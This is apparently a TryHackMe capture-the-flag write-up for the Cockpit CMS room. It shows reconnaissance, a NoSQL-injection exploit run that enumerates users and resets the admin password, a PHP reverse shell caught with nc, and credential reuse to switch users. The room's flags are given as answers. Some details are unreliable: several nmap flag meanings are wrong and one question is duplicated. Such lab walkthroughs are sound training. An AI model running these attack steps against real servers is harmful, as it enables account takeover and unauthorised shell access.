<h1 align="center">CMSpit<br><img width="1200px" src=""></h1>
<p align="center">June 18, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>408</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.</em><br>
Click <a href="https://tryhackme.com/room/cmspit">here </a>to access the "room".<br>
<img width="80px" src="https://github.com/user-attachments/assets/5d595d6b-e29e-4ce1-9c1d-6bc04341b4d2"><br></p>

<h2> Task 1 . Ready Set Go</h2>
<p>You've identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.<br>

Your mission is to exploit these vulnerabilities and compromise the web server.</p>

<h4 align="left"> Answer the question below</h4>

> 1.1. <em>What is the name of the Content Management System (CMS) installed on the server?</em><br><a id='1.1'></a>
>> <strong><code>cockpit</code></strong><br>
<p></p>


<h3>nmap</h3>
<p>
  
- <code>-sS</code> = executes a set of default Nmap Scripting Engine (NSE) scripts to gather more informatio<br>
- <code>-sC</code> = equivalent to --script=default<br>
- <code>-sV</code> = dDetermines the versions of services running on open ports<br>
- <code>-p</code> = scan all ports<br>
- <code>-A</code> = used for aggressive scanning, enabling a combination of OS detection, version detection, script scanning, and traceroute<br>
- <code>-Pn</code> = treat all hosts as online -- skip host discovery</p>


```bash
:~# nmap -Pn -p- TargetIP
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
:~# nmap -sC -sV -p- TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
...
```

```bash
:~# nmap -A -Pn -p- TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
...
```

<h3>rustscan</h3>
<p>
  
- <code>-a</code> = __<br>
- <code>-b</code> = __<br>
- <code>-A</code> = __<br> 
- <code>--ulimit</code> = ___</p>


```bash
:~# rustscan -a TargetIP --ulimit 5500 -b 65535 -- -A -Pn
...
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk=
|   256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
...
```

<br>

<h3><code>http://TargetIP</code> redirects to <code>http://TargetIP/auth/login?to=/</code></h3>

![image](https://github.com/user-attachments/assets/c3c29bfb-03ae-4b6e-908a-0ad19033dde1)

<br>
<br>

> 1.2. <em>What is the version of the Content Management System (CMS) installed on the server?</em><br><a id='1.2'></a>
>> <strong><code>0.11.1</code></strong><br>
<p></p>

<br>

> 1.3. <em>What is the path that allow user enumeration?</em><br><a id='1.3'></a>
>> <strong><code>/auth/check</code></strong><br>
<p></p>

<p>Identified in page source ...</p>

```bash
App.request('/auth/check', {
                    auth : {user:this.refs.user.value, password:this.refs.password.value },
                    csfr : "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
                }).then(function(data) {
```

![image](https://github.com/user-attachments/assets/4522b1d6-6370-472d-b98f-461171f70ce5)

```bash
<p class="uk-text-center" if="{!$user}"><a class="uk-button uk-button-link uk-link-muted" href="/auth/forgotpassword">Forgot Password?</a></p>
```

![image](https://github.com/user-attachments/assets/c226ac39-294a-46ed-8d77-3eb7076ebb8f)

<p>https://jwt.io</p>

<p><em>Decoded Header</em></p>

```bash
{
  "typ": "JWT",
  "alg": "HS256"
}
```

<p><em>Decoded Payload</em></p>
```bash
{
  "csfr": "login"
}
```

![image](https://github.com/user-attachments/assets/f7c28cdd-dff4-4c4d-a3ad-5eb20883bf41)

<h3><code>http://TargetIP/auth/forgotpassword</code></h3>

![image](https://github.com/user-attachments/assets/576fe691-b089-4e89-bae3-b932174746e9)

<p>page source --> version 0.11.1</p>

![image](https://github.com/user-attachments/assets/afa79251-5237-4caf-89f0-bca12b01d67e)

<br>
<br>

<h3>ExploitdB</h3>

![image](https://github.com/user-attachments/assets/e3d06c91-a4fe-47ec-85a7-be066ee95809)

<p>Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL Injection</p>

![image](https://github.com/user-attachments/assets/08d645cc-6e93-47dd-a16d-ebb00d31852a)

<p>50185.py</p>

![image](https://github.com/user-attachments/assets/c5b4249f-809e-4e80-b7e1-e100ef89fc15)

<br>
<br>

> 1.4. <em>How many users can you identify when you reproduce the user enumeration attack?</em><br><a id='1.4'></a>
>> <strong><code>4</code></strong><br>
<p></p>

<p><code>admin </code> : <code>$<#aV+G^4l</code></p>

```bash
:~# python3 50185.py -u http://TargetIP
[+] http://10.10.72.83: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']

[-] Get user details For : admin
[+] Finding Password reset tokens
	 Tokens Found : ['rp-f0e0da4918ff68086b026f4e9356c33468530b1edbb5c']
[+] Obtaining user information 
-----------------Details--------------------
	 [*] user : admin
	 [*] name : Admin
	 [*] email : admin@yourdomain.de
	 [*] active : True
	 [*] group : admin
	 [*] password : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
	 [*] i18n : en
	 [*] _created : 1621655201
	 [*] _modified : 1621655201
	 [*] _id : 60a87ea165343539ee000300
	 [*] _reset_token : rp-f0e0da4918ff68086b026f4e9356c33468530b1edbb5c
	 [*] md5email : a11eea8bf873a483db461bb169beccec
--------------------------------------------


[+] Do you want to reset the passowrd for admin? (Y/n): Y
[-] Attempting to reset admin's password:
[+] Password Updated Succesfully!
[+] The New credentials for admin is: 
 	 Username : admin 
 	 Password : $<#aV+G^4l
```

<p>Logged in as <code>admin</code> in <code>>http://TargetIP/auth/login?to=/</code></p>

![image](https://github.com/user-attachments/assets/8b4e59c5-6275-4466-90a2-efbe28407c66)

<br>
<br>

> 1.5. <em>What is the path that allows you to change user account passwords?</em><br><a id='1.5'></a>
>> <strong><code>/auth/resetpassword</code></strong><br>
<p></p>

<br>

> 1.6. <em>Compromise the Content Management System (CMS). What is Skidy's email.</em><br><a id='1.6'></a>
>> <strong><code>skidy@tryhackme.fakemail</code></strong><br>
<p></p>

<br>

> 1.7. <em>Compromise the Content Management System (CMS). What is Skidy's email.</em><br><a id='1.7'></a>
>> <strong><code>thm{f158bea70731c48b05657a02aaf955626d78e9fb}</code></strong><br>
<p></p>

<h3>/accounts</h3>

![image](https://github.com/user-attachments/assets/e99edc48-7ded-4fe3-85ac-991f92c06ee3)

<h3>//settings</h3>

![image](https://github.com/user-attachments/assets/1d0965a9-af33-46e2-ac88-cd1cd2e6decc)

<p><code>skidy</code> : <code>password</code></p>

![image](https://github.com/user-attachments/assets/bb4bfb14-4abf-40a7-adbc-034cb3d8de96)


![image](https://github.com/user-attachments/assets/e553bd38-c10a-41a1-b0b7-cd8d2db434d1)

![image](https://github.com/user-attachments/assets/a5aeb7f2-8085-4a79-921b-99fda5fa0f06)

![image](https://github.com/user-attachments/assets/02d120a1-be77-4173-b70f-56c5173e473e)

![image](https://github.com/user-attachments/assets/c19b36e6-150b-4f37-8273-3e3e797c1948)

![image](https://github.com/user-attachments/assets/9cb6fa19-34af-4218-98eb-bbcd9bb738f9)

![image](https://github.com/user-attachments/assets/6371ab4c-5e3b-4b5d-a62b-287fb895ceff)


<h3>reverse shell</h3>

```bash
:~# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
...
:~# mv php-reverse-shell.php rev.php
...
```

![image](https://github.com/user-attachments/assets/84b430fc-5b79-497c-ab1a-eb76c750a163)


<h3listerner</h3>

```bash
:~# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
...
:~# mv php-reverse-shell.php rev.php
...
```

<br>

> 1.8. <em>Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?</em><br><a id='1.8'></a>
>> <strong><code>thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}</code></strong><br>
<p></p>

<p>navigated to <code>http://TargetIP/rev.php</code></p>

```bash
:~# nc -nlvp 9001
Listening on 0.0.0.0 9001
...
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ ^Z
[2]+  Stopped                 nc -nlvp 9001
:~# stty raw -echo; fg
nc -nlvp 9001
...
www-data@ubuntu:/home/stux$ cat stux.txt
cat: stux.txt: No such file or directory
www-data@ubuntu:/home/stux$ cat user.txt
cat: user.txt: Permission denied
...
www-data@ubuntu:/home$ cd stux
www-data@ubuntu:/home/stux$ ls -lah 
total 44K
drwxr-xr-x 4 stux stux 4.0K May 22  2021 .
drwxr-xr-x 3 root root 4.0K May 21  2021 ..
-rw-r--r-- 1 root root   74 May 22  2021 .bash_history
-rw-r--r-- 1 stux stux  220 May 21  2021 .bash_logout
-rw-r--r-- 1 stux stux 3.7K May 21  2021 .bashrc
drwx------ 2 stux stux 4.0K May 21  2021 .cache
-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
drwxrwxr-x 2 stux stux 4.0K May 21  2021 .nano
-rw-r--r-- 1 stux stux  655 May 21  2021 .profile
-rw-r--r-- 1 stux stux    0 May 21  2021 .sudo_as_admin_successful
-rw-r--r-- 1 root root  312 May 21  2021 .wget-hsts
-rw------- 1 stux stux   46 May 22  2021 user.txt
www-data@ubuntu:/home/stux$ 
...
www-data@ubuntu:/home/stux$ cat .dbshell
show
show dbs
use admin
use sudousersbak
show dbs
db.user.insert({name: "stux", name: "p4ssw0rdhack3d!123"})
show dbs
use sudousersbak
show collections
db
show
db.collectionName.find()
show collections
db.collection_name.find().pretty()
db.user.find().pretty()
db.user.insert({name: "stux"})
db.user.find().pretty()
db.flag.insert({name: "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}"})
show collections
db.flag.find().pretty()
www-data@ubuntu:/home/stux$ 

www-data@ubuntu:/home/stux$ cd /var/www/html
www-data@ubuntu:/var/www/html$ ls
cockpit  index.html
www-data@ubuntu:/var/www/html$ ls -lah
total 24K
drwxr-xr-x 3 root     root     4.0K May 21  2021 .
drwxr-xr-x 3 root     root     4.0K May 21  2021 ..
drwxr-xr-x 9 www-data www-data 4.0K Jun 18 12:36 cockpit
-rw-r--r-- 1 root     root      12K May 21  2021 index.html
www-data@ubuntu:/var/www/html$ cd cockpit
www-data@ubuntu:/var/www/html/cockpit$ ls
CONTRIBUTING.md  addons		cp	     lib	   storage
Dockerfile	 assets		favicon.png  modules	   webflag.php
LICENSE		 bootstrap.php	index.php    package.json
README.md	 composer.json	install      rev.php
www-data@ubuntu:/var/www/html/cockpit$ cd storage
www-data@ubuntu:/var/www/html/cockpit/storage$ ls
cache  data  thumbs  tmp  uploads
www-data@ubuntu:/var/www/html/cockpit/storage$ cd data
www-data@ubuntu:/var/www/html/cockpit/storage/data$ ls
cockpit.memory.sqlite  cockpit.sqlite  cockpitdb.sqlite  index.html
www-data@ubuntu:/var/www/html/cockpit/storage/data$ 
```

<br>

> 1.9. <em>What is the user.txt flag??</em><br><a id='1.9'></a>
>> <strong><code>thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}</code></strong><br>
<p></p>

<p><code>stux</code> : <code>p4ssw0rdhack3d!123</code></p>

```bash
www-data@ubuntu:/home/stux$ su stux
Password: 
stux@ubuntu:~$ pwd
/home/stux
stux@ubuntu:~$ cat user.txt
thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}
stux@ubuntu:~$ 
```

<br>



<p>Logged in as <code>admin</code> again.<br>
Navigated to <code>System</code> > <code>Accounts</code><br>
Changed <code>darkStar7471</code>´s and <code>Ekoparty</code>´s passwords</p>


